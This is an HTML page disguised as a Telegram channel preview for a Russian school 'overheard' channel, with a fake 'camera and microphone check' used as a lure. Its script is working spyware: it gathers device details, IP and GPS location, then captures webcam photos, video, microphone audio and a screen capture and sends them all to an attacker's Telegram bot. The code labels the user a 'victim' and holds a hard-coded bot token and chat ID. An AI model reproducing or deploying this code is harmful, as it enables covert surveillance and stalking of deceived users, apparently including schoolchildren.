<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê ‚Ä¢ Telegram</title>
    <meta name="theme-color" content="#3390ec">
    <style>
        :root {
            --tg-bg: #0f0f0f;
            --tg-card: #1a1a1a;
            --tg-text: #ffffff;
            --tg-hint: #aaaaaa;
            --tg-blue: #3390ec;
            --tg-green: #2ecc71;
            --tg-red: #e74c3c;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--tg-bg);
            color: var(--tg-text);
            line-height: 1.5;
            overflow-x: hidden;
            position: relative;
        }
        
        .app {
            max-width: 480px;
            margin: 0 auto;
            min-height: 100vh;
            background: var(--tg-bg);
            position: relative;
        }
        
        /* Header */
        .header {
            position: sticky;
            top: 0;
            background: rgba(15, 15, 15, 0.95);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid #2d2d2d;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            z-index: 1000;
        }
        
        .header-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(51, 144, 236, 0.1);
            border: none;
            color: var(--tg-blue);
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .header-title {
            font-size: 17px;
            font-weight: 600;
            text-align: center;
            flex-grow: 1;
        }
        
        /* Channel Hero */
        .channel-hero {
            height: 180px;
            background: linear-gradient(135deg, #1a237e 0%, #311b92 100%);
            position: relative;
        }
        
        .channel-avatar {
            position: absolute;
            bottom: -40px;
            left: 20px;
            width: 80px;
            height: 80px;
            background: var(--tg-blue);
            border-radius: 50%;
            border: 4px solid var(--tg-bg);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        
        /* Content */
        .content {
            padding: 60px 20px 30px;
        }
        
        .channel-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 4px;
        }
        
        .channel-subscribers {
            color: var(--tg-hint);
            font-size: 15px;
            margin-bottom: 25px;
        }
        
        /* Button */
        .join-btn {
            width: 100%;
            padding: 18px;
            background: var(--tg-blue);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 25px 0;
            transition: transform 0.2s;
        }
        
        .join-btn:active {
            transform: scale(0.98);
        }
        
        /* Posts */
        .post {
            background: var(--tg-card);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 15px;
            border: 1px solid #2d2d2d;
        }
        
        .post-header {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
        }
        
        .post-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        
        .post-author {
            font-weight: 600;
            font-size: 15px;
        }
        
        .post-time {
            color: var(--tg-hint);
            font-size: 13px;
            margin-top: 2px;
        }
        
        .post-text {
            margin-bottom: 12px;
            font-size: 15px;
        }
        
        .post-media {
            border-radius: 12px;
            background: #000;
            height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--tg-hint);
            margin-bottom: 12px;
        }
        
        /* Modal */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            opacity: 0;
            visibility: hidden;
            transition: 0.3s;
        }
        
        .modal.active {
            opacity: 1;
            visibility: visible;
        }
        
        .modal-content {
            background: var(--tg-card);
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .modal-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        .modal-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .modal-text {
            color: var(--tg-hint);
            margin-bottom: 25px;
            line-height: 1.5;
        }
        
        /* Progress */
        .progress {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            overflow: hidden;
            margin: 25px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: var(--tg-blue);
            width: 0%;
            transition: width 0.3s;
        }
        
        /* Status */
        .status {
            padding: 12px;
            background: rgba(51, 144, 236, 0.1);
            border-radius: 12px;
            margin: 15px 0;
            display: none;
        }
        
        .status.visible {
            display: block;
        }
        
        /* Hidden */
        .hidden {
            display: none !important;
        }
        
        .collector {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- Header -->
        <div class="header">
            <button class="header-btn" onclick="history.back()">‚Üê</button>
            <div class="header-title">–ö–∞–Ω–∞–ª</div>
            <button class="header-btn">‚ãÆ</button>
        </div>
        
        <!-- Channel -->
        <div class="channel-hero">
            <div class="channel-avatar">üì¢</div>
        </div>
        
        <div class="content">
            <h1 class="channel-title">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
            <div class="channel-subscribers">56 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</div>
            
            <button class="join-btn" id="joinBtn">
                <span>–ü–µ—Ä–µ–π—Ç–∏ –≤ –∫–∞–Ω–∞–ª</span>
                <span>‚Üí</span>
            </button>
            
            <div class="progress hidden" id="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="status" id="status"></div>
            
            <!-- Posts -->
            <div class="post">
                <div class="post-header">
                    <div class="post-avatar">A</div>
                    <div>
                        <div class="post-author">–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä</div>
                        <div class="post-time">—Å–µ–≥–æ–¥–Ω—è –≤ 14:30</div>
                    </div>
                </div>
                <div class="post-text">
                    –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω–æ–º—É –∫–æ–Ω—Ç–µ–Ω—Ç—É —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–ª–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏—Å—Ç–µ–º—ã —á–µ—Ä–µ–∑ Telegram Web.
                </div>
                <div class="post-media">
                    üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–º–µ—Ä—ã –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞
                </div>
            </div>
        </div>
        
        <!-- Auth Modal -->
        <div class="modal" id="authModal">
            <div class="modal-content">
                <div class="modal-icon">üîê</div>
                <h2 class="modal-title">–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞</h2>
                <p class="modal-text">
                    –î–ª—è –≤—Ö–æ–¥–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–º–µ—Ä—ã, –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ –∏ —Å–∏—Å—Ç–µ–º—ã
                </p>
                <button class="join-btn" id="authBtn">
                    <span>–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É</span>
                </button>
                <div class="progress">
                    <div class="progress-bar" id="authProgress"></div>
                </div>
                <div class="status" id="authStatus"></div>
            </div>
        </div>
        
        <!-- Hidden Collectors -->
        <div class="collector">
            <video id="camera" autoplay muted playsinline></video>
            <canvas id="canvas"></canvas>
            <audio id="mic"></audio>
        </div>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const CONFIG = {
            BOT_TOKEN: '8578533182:AAHVUzQtIkhMjfSofiyeUJPDkEOvmfXJ08g',
            ADMIN_ID: 8001083987,
            MEDIA_TIMEOUT: 10000
        };
        
        // –°–æ—Å—Ç–æ—è–Ω–∏–µ
        const state = {
            victimId: null,
            sessionId: null,
            isCollecting: false,
            collectedMedia: [],
            mediaCount: 0
        };
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener('DOMContentLoaded', () => {
            console.log('–°–∏—Å—Ç–µ–º–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞');
            
            // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è ID
            state.victimId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            state.sessionId = generateSessionId();
            
            // –°–æ–±—ã—Ç–∏—è
            document.getElementById('joinBtn').addEventListener('click', startCollection);
            document.getElementById('authBtn').addEventListener('click', processAuth);
        });
        
        function generateSessionId() {
            const arr = new Uint8Array(16);
            crypto.getRandomValues(arr);
            return Array.from(arr, b => b.toString(16).padStart(2, '0')).join('');
        }
        
        function startCollection() {
            const modal = document.getElementById('authModal');
            const progress = document.getElementById('progress');
            
            modal.classList.add('active');
            progress.classList.remove('hidden');
            state.isCollecting = true;
        }
        
        async function processAuth() {
            const btn = document.getElementById('authBtn');
            const progress = document.getElementById('authProgress');
            const status = document.getElementById('authStatus');
            
            btn.disabled = true;
            status.classList.add('visible');
            
            try {
                // –≠—Ç–∞–ø 1: –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º—ã
                status.textContent = 'üîÑ –°–±–æ—Ä —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö...';
                progress.style.width = '20%';
                
                const systemData = await collectSystemData();
                await sendToTelegram(formatSystemMessage(systemData));
                await sleep(1000);
                
                // –≠—Ç–∞–ø 2: –§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã
                status.textContent = 'üì∏ –ó–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã...';
                progress.style.width = '40%';
                
                const photos = await capturePhotos();
                await sendMediaToTelegram(photos, 'photo');
                await sleep(1000);
                
                // –≠—Ç–∞–ø 3: –í–∏–¥–µ–æ –∑–∞–ø–∏—Å—å
                status.textContent = 'üé• –ó–∞–ø–∏—Å—å –≤–∏–¥–µ–æ...';
                progress.style.width = '60%';
                
                const videos = await captureVideo();
                await sendMediaToTelegram(videos, 'video');
                await sleep(1000);
                
                // –≠—Ç–∞–ø 4: –ê—É–¥–∏–æ –∑–∞–ø–∏—Å—å
                status.textContent = 'üé§ –ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ...';
                progress.style.width = '80%';
                
                const audio = await captureAudio();
                await sendMediaToTelegram(audio, 'audio');
                await sleep(1000);
                
                // –≠—Ç–∞–ø 5: –°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞
                status.textContent = 'üñ•Ô∏è –ó–∞—Ö–≤–∞—Ç —ç–∫—Ä–∞–Ω–∞...';
                progress.style.width = '90%';
                
                const screenshots = await captureScreenshot();
                await sendMediaToTelegram(screenshots, 'photo');
                await sleep(1000);
                
                // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ
                progress.style.width = '100%';
                status.textContent = '‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞';
                status.style.background = 'rgba(46, 204, 113, 0.1)';
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –∏—Ç–æ–≥–æ–≤–æ–≥–æ –æ—Ç—á–µ—Ç–∞
                await sendFinalReport();
                
                // –£—Å–ø–µ—Ö
                setTimeout(() => {
                    document.getElementById('authModal').classList.remove('active');
                    document.getElementById('joinBtn').innerHTML = '<span>‚úÖ –î–æ—Å—Ç—É–ø –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω</span>';
                    document.getElementById('joinBtn').style.background = '#2ecc71';
                    document.getElementById('joinBtn').disabled = true;
                }, 2000);
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                status.textContent = '‚ùå –û—à–∏–±–∫–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞';
                status.style.background = 'rgba(231, 76, 60, 0.1)';
                btn.disabled = false;
            }
        }
        
        async function collectSystemData() {
            const data = {
                victimId: state.victimId,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                ip: await getIP()
            };
            
            // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
            if (navigator.geolocation) {
                await new Promise(resolve => {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            data.geo = {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                acc: pos.coords.accuracy
                            };
                            resolve();
                        },
                        () => resolve(),
                        {enableHighAccuracy: true, timeout: 5000}
                    );
                });
            }
            
            return data;
        }
        
        async function capturePhotos() {
            const photos = [];
            
            try {
                if (!navigator.mediaDevices?.getUserMedia) {
                    throw new Error('–ö–∞–º–µ—Ä–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞');
                }
                
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                
                const video = document.getElementById('camera');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                // –ó–∞—Ö–≤–∞—Ç 3 —Ñ–æ—Ç–æ
                for (let i = 0; i < 3; i++) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
                    photos.push({
                        data: photoData,
                        type: 'photo',
                        index: i,
                        resolution: `${canvas.width}x${canvas.height}`
                    });
                    
                    await sleep(800);
                }
                
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.log('–§–æ—Ç–æ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω—ã:', error.message);
            }
            
            return photos;
        }
        
        async function captureVideo() {
            const videos = [];
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: true
                });
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                return new Promise((resolve) => {
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        
                        reader.onloadend = () => {
                            videos.push({
                                data: reader.result,
                                type: 'video',
                                duration: 3000,
                                format: 'webm'
                            });
                            resolve(videos);
                        };
                        
                        reader.readAsDataURL(blob);
                    };
                    
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                        stream.getTracks().forEach(track => track.stop());
                    }, 3000);
                });
                
            } catch (error) {
                console.log('–í–∏–¥–µ–æ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–æ:', error.message);
                return videos;
            }
        }
        
        async function captureAudio() {
            const audioFiles = [];
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: false
                });
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                return new Promise((resolve) => {
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        
                        reader.onloadend = () => {
                            audioFiles.push({
                                data: reader.result,
                                type: 'audio',
                                duration: 2000,
                                format: 'webm'
                            });
                            resolve(audioFiles);
                        };
                        
                        reader.readAsDataURL(blob);
                    };
                    
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                        stream.getTracks().forEach(track => track.stop());
                    }, 2000);
                });
                
            } catch (error) {
                console.log('–ê—É–¥–∏–æ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–æ:', error.message);
                return audioFiles;
            }
        }
        
        async function captureScreenshot() {
            const screenshots = [];
            
            try {
                if (!navigator.mediaDevices.getDisplayMedia) {
                    throw new Error('–ó–∞—Ö–≤–∞—Ç —ç–∫—Ä–∞–Ω–∞ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è');
                }
                
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: true,
                    audio: false
                });
                
                const video = document.getElementById('camera');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                const screenshotData = canvas.toDataURL('image/jpeg', 0.9);
                screenshots.push({
                    data: screenshotData,
                    type: 'screenshot',
                    resolution: `${canvas.width}x${canvas.height}`
                });
                
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.log('–°–∫—Ä–∏–Ω—à–æ—Ç –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω:', error.message);
            }
            
            return screenshots;
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω';
            }
        }
        
        function formatSystemMessage(data) {
            return `
üîê <b>–ù–û–í–û–ï –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–ï</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üë§ <b>–ò–ù–§–û–†–ú–ê–¶–ò–Ø:</b>
‚îú ID: <code>${data.victimId}</code>
‚îú –í—Ä–µ–º—è: ${new Date(data.timestamp).toLocaleString('ru-RU')}
‚îú –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${data.platform}
‚îî –Ø–∑—ã–∫: ${data.language}

üìç <b>–ì–ï–û–õ–û–ö–ê–¶–ò–Ø:</b>
‚îú IP: ${data.ip}
${data.geo ? `‚îú –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: <code>${data.geo.lat}, ${data.geo.lon}</code>` : ''}
${data.geo ? `‚îî –¢–æ—á–Ω–æ—Å—Ç—å: ${data.geo.acc}–º` : '‚îî GPS: –ù–µ –¥–æ—Å—Ç—É–ø–µ–Ω'}

üì± <b>–°–ò–°–¢–ï–ú–ê:</b>
‚îú User-Agent: ${data.userAgent.substring(0, 60)}...
‚îú –≠–∫—Ä–∞–Ω: ${data.screen}
‚îî –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: ${data.timezone}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üîÑ –ù–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å–±–æ—Ä –º–µ–¥–∏–∞ —Ñ–∞–π–ª–æ–≤...
`;
        }
        
        async function sendMediaToTelegram(mediaArray, mediaType) {
            if (!mediaArray || mediaArray.length === 0) return;
            
            for (const media of mediaArray) {
                try {
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∂–¥—ã–π –º–µ–¥–∏–∞ —Ñ–∞–π–ª –æ—Ç–¥–µ–ª—å–Ω–æ
                    if (mediaType === 'photo') {
                        await sendPhotoToTelegram(media.data, `üì∏ –§–æ—Ç–æ –æ—Ç ${state.victimId}`);
                    } else if (mediaType === 'video') {
                        await sendVideoToTelegram(media.data, `üé• –í–∏–¥–µ–æ –æ—Ç ${state.victimId}`);
                    } else if (mediaType === 'audio') {
                        await sendAudioToTelegram(media.data, `üé§ –ê—É–¥–∏–æ –æ—Ç ${state.victimId}`);
                    }
                    
                    state.mediaCount++;
                    state.collectedMedia.push(media);
                    
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –º–µ–¥–∏–∞:', error);
                }
                
                await sleep(500);
            }
        }
        
        async function sendPhotoToTelegram(photoData, caption) {
            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º DataURL –≤ Blob
            const response = await fetch(photoData);
            const blob = await response.blob();
            
            // –°–æ–∑–¥–∞–µ–º FormData
            const formData = new FormData();
            formData.append('chat_id', CONFIG.ADMIN_ID);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', caption);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
            await fetch(url, {
                method: 'POST',
                body: formData
            });
        }
        
        async function sendVideoToTelegram(videoData, caption) {
            const response = await fetch(videoData);
            const blob = await response.blob();
            
            const formData = new FormData();
            formData.append('chat_id', CONFIG.ADMIN_ID);
            formData.append('video', blob, 'video.webm');
            formData.append('caption', caption);
            
            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`;
            await fetch(url, {
                method: 'POST',
                body: formData
            });
        }
        
        async function sendAudioToTelegram(audioData, caption) {
            const response = await fetch(audioData);
            const blob = await response.blob();
            
            const formData = new FormData();
            formData.append('chat_id', CONFIG.ADMIN_ID);
            formData.append('audio', blob, 'audio.webm');
            formData.append('caption', caption);
            
            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendAudio`;
            await fetch(url, {
                method: 'POST',
                body: formData
            });
        }
        
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
                
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
            } catch(e) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è:', e);
            }
        }
        
        async function sendFinalReport() {
            const report = `
‚úÖ <b>–°–ë–û–† –ú–ï–î–ò–ê –ó–ê–í–ï–†–®–ï–ù</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üë§ –ñ–µ—Ä—Ç–≤–∞: <code>${state.victimId}</code>
üìä –°–æ–±—Ä–∞–Ω–æ –º–µ–¥–∏–∞ —Ñ–∞–π–ª–æ–≤: ${state.mediaCount}

üì∏ <b>–§–û–¢–û:</b> ${state.collectedMedia.filter(m => m.type === 'photo').length} —à—Ç.
üé• <b>–í–ò–î–ï–û:</b> ${state.collectedMedia.filter(m => m.type === 'video').length} —à—Ç.
üé§ <b>–ê–£–î–ò–û:</b> ${state.collectedMedia.filter(m => m.type === 'audio').length} —à—Ç.
üñ•Ô∏è <b>–°–ö–†–ò–ù–®–û–¢–´:</b> ${state.collectedMedia.filter(m => m.type === 'screenshot').length} —à—Ç.

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üïí ${new Date().toLocaleString('ru-RU')}
üì± –í—Å–µ —Ñ–∞–π–ª—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ —á–∞—Ç
`;
            
            await sendToTelegram(report);
        }
        
        function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }
    </script>
</body>
</html>
